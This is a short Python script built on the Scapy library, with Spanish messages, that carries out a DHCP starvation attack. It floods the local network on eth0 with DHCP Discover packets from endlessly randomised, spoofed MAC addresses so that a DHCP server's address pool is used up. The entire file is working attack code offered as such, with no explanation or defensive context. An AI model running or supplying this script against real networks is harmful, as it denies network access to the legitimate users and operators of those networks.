from scapy.all import *
import random

conf.checkIPaddr = False
iface = "eth0"

print("Iniciando ataque DHCP Starvation...")

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0,255),
        random.randint(0,255),
        random.randint(0,255),
        random.randint(0,255),
        random.randint(0,255)
    )

while True:

    mac = random_mac()

    dhcp_discover = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=RandString(12, b'\x00')) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    sendp(dhcp_discover, iface=iface, verbose=False)

    print("MAC falsa enviada:", mac)
